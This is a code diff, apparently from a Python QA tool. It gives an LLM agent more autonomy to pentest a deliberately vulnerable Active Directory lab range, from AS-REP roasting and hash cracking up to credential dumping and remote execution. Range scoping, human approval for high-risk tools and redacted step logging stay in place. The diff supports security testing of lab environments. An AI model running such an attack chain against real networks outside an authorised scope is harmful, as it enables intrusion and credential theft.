+  拿到全網域憑證 / 真的能執行程式碼」時用這幾個,是整條攻擊鏈的最後一步驗證。
+
+沒有固定的第 1234 步 —— 你自己決定探索順序、要不要回頭重試、要不要繞道用 run_tool
+補一個沒有現成工具的檢測。**核心原則是自己不斷推理、不斷往下試,一路做到你真的沒有
+下一步可做 (該試的列舉/破解/偵察手法都試過了),或者下一步是需要人工核准的高風險動作
+(password_spray/secretsdump_dc/wmiexec_run/psexec_run) 時,才停下來。不要在還有其他
+可自主嘗試的手段時就提早放棄、丟回一個「沒有憑證所以沒測」的報告。** 找到初始存取
+(AS-REP roastable 帳號、弱密碼帳號、破出來的 hash...) 或任何有意義的發現,隨時記下來,
+最後整理進報告。
 
 重要:
-- 工具已經做了確定性的 pass/fail 判定,你直接採信工具回傳的 status,不要自己改判。
-- 你只負責編排順序、判斷結果、寫報告。不要嘗試自由組指令。
-- 全程只針對探索到的 range 目標,不得對網段外主機下手。
+- 工具做確定性判定時你直接採信,不要自己竄改。
+- 唯一的硬限制是目標鎖定探索到的 range 網段 (nmap/curl/impacket 等所有工具共用這道檢查),
+  不得對網段外主機下手;這個範圍內怎麼查都可以自己決定,不必受限於預先寫死的流程。
+- password_spray / secretsdump_dc / wmiexec_run / psexec_run 有鎖帳/登入機器風險,一定要
+  走 HITL 核准,不能因為想省事就跳過或用 run_tool 繞過 (run_tool 的允許清單本來就不含
+  這幾類工具)。呼叫前先說明你為什麼判斷值得做這一步。
+- 每一步工具呼叫都會被自動記錄 (逐步 log),不需要你自己額外做記錄動作。
+- 最後要輸出結構化 QA 報告,status 用 exploitable(可利用)/not_tested(沒測到或缺條件)/
+  error 表示;沒有 planted_but_broken 這個狀態的意義 (沒有「種植」動作),不要用它。
 """
 
 
@@ -465,19 +916,95 @@ def build_llm():
                            temperature=0)
 
 
+# ═══════════════════════════════════════════════════════════════════════════
+# 無條件的每步紀錄 (與 --observe LLM 觀察員無關,永遠開啟)。
+# --observe 那套要呼叫 LLM 做因果推理,可能失敗/變慢/需要額外後端;這裡是純寫檔,
+# 保證「無時無刻」都有一份逐步 log,不依賴任何外部服務。
+# ═══════════════════════════════════════════════════════════════════════════
+_STEP_LOG_PATH: Optional[str] = None
+_STEP_SEQ = 0
+_REDACT_KEYS = {"password", "pw", "ntlm_hash", "qa_pass"}
+
+
+def _init_step_log(range_id: str, output_dir: str = ".") -> str:
+    global _STEP_LOG_PATH, _STEP_SEQ
+    _STEP_SEQ = 0
+    os.makedirs(output_dir, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    _STEP_LOG_PATH = os.path.join(output_dir, f"qa_steps_{range_id}_{ts}.jsonl")
+    open(_STEP_LOG_PATH, "w", encoding="utf-8").close()
+    return _STEP_LOG_PATH
+
+
+def _redact(obj):
+    if isinstance(obj, dict):
+        return {k: ("***REDACTED***" if k in _REDACT_KEYS and v else _redact(v))
+                for k, v in obj.items()}
+    if isinstance(obj, list):
+        return [_redact(x) for x in obj]
+    return obj
+
+
+def _log_step(tool_name: str, tool_input: dict, result: str) -> None:
+    """每次工具呼叫都會寫一行 JSONL,不管有沒有開 --observe。"""
+    global _STEP_SEQ
+    if not _STEP_LOG_PATH:
+        return
+    _STEP_SEQ += 1
+    entry = {"seq": _STEP_SEQ, "ts": datetime.now(timezone.utc).isoformat(),
+             "tool": tool_name, "input": _redact(tool_input), "result": result[:2000]}
+    try:
+        with open(_STEP_LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(json.dumps(entry, ensure_ascii=False) + "\n")
+    except OSError:
+        pass
+
+
+def _wrap_with_step_log(tools: list) -> list:
+    """幫每個工具包一層無條件 log,不改變工具的 name/description/schema。"""
+    from functools import wraps
+    from langchain.tools import StructuredTool
+
+    wrapped = []
+    for t in tools:
+        original_func = t.func if hasattr(t, "func") else t
+        name = t.name if hasattr(t, "name") else str(t)
+        desc = t.description if hasattr(t, "description") else ""
+        schema = t.args_schema if hasattr(t, "args_schema") else None
+
+        @wraps(original_func)
+        def make_wrapper(orig_fn, orig_name):
+            def wrapper(*args, **kwargs):
+                result = orig_fn(*args, **kwargs)
+                tool_input = dict(kwargs)
+                if args:
+                    tool_input["_positional"] = list(args)
+                _log_step(orig_name, tool_input, result if isinstance(result, str)
+                          else json.dumps(result, ensure_ascii=False))
+                return result
+            return wrapper
+
+        wrapped.append(StructuredTool.from_function(
+            func=make_wrapper(original_func, name), name=name, description=desc,
+            args_schema=schema,
+        ))
+    return wrapped
+
+
 def build_qa_agent(observer=None):
     """用 create_agent + HumanInTheLoopMiddleware 建 QA agent。
-    若傳入 observer (ObserverAgent),會將 QA_TOOLS 包裹成帶觀察的版本。"""
+    每個工具都會被 _wrap_with_step_log 包一層,無條件寫逐步 log (與 --observe 無關)。
+    若另外傳入 observer (ObserverAgent),再疊一層 LLM 因果推理觀察 (選用,較重)。"""
     from langchain.agents import create_agent
     try:
         from langchain.agents.middleware import HumanInTheLoopMiddleware
         mw = [HumanInTheLoopMiddleware(interrupt_on={t: True for t in HITL_TOOLS})]
     except Exception:
-        mw = []  # 舊版無 middleware 時退化為無 HITL (仍安全,因 suggest_fix 不直接執行)
+        mw = []  # 舊版無 middleware 時退化為無 HITL (仍安全,因高風險工具本身仍受 range 鎖)
 
-    tools = QA_TOOLS
+    tools = _wrap_with_step_log(QA_TOOLS)
     if observer is not None:
-        tools = observer.wrap_qa_tools(QA_TOOLS)
+        tools = observer.wrap_qa_tools(tools)
 
     agent = create_agent(
         model=build_llm(),
@@ -524,7 +1051,12 @@ def run(a) -> None:
             print("已取消。")
             return
 
-    # Observer Agent 初始化
+    # 無條件的逐步 log (無時無刻紀錄每一步,與 --observe 無關,永遠開啟)
+    step_log_dir = getattr(a, "observer_output", None) or "."
+    step_log_path = _init_step_log(_MF.get("range_id", "range"), step_log_dir)
+    print(f"[QA] 逐步 log: {step_log_path}")
+
+    # Observer Agent 初始化 (選用,LLM 因果推理,疊加在逐步 log 之上)
     observer = None
     if getattr(a, "observe", False):
         from observer_agent import ObserverAgent
@@ -538,11 +1070,13 @@ def run(a) -> None:
     config = {"configurable": {"thread_id": a.thread_id}}
     if _NO_MANIFEST:
         task = (f"對探索到的 range (網域 {_MF['ad_domain']}, DC {_MF['machines'][0]['ip']}) "
-                f"做基線稽核。沒有種植弱點清單,先確認基礎設施,再對已知 AD 弱點檢測項目 "
-                f"跑 generic_ad_audit,最後給我一份 QA 報告。")
+                f"做黑箱滲透式稽核。沒有種植弱點清單,自己判斷探索順序、要不要嘗試找初始存取、"
+                f"要不要用 run_tool/crack_hash/web_fetch_range 深入查,不必照固定步驟走。"
+                f"最後給我一份 QA 報告。")
     else:
         task = (f"驗證 range '{_MF['range_id']}' (網域 {_MF['ad_domain']})。"
-                f"先看種了哪些弱點、跑基礎設施驗證,再逐一測試每個弱點是否可利用,"
+                f"自己判斷驗證順序,對種下的弱點逐一確認是否真的可利用,遇到卡關可以自己用"
+                f"run_tool/crack_hash/web_fetch_range 深入查根因,不必照固定步驟走。"
                 f"最後給我一份 QA 報告。")
 
     from langgraph.types import Command
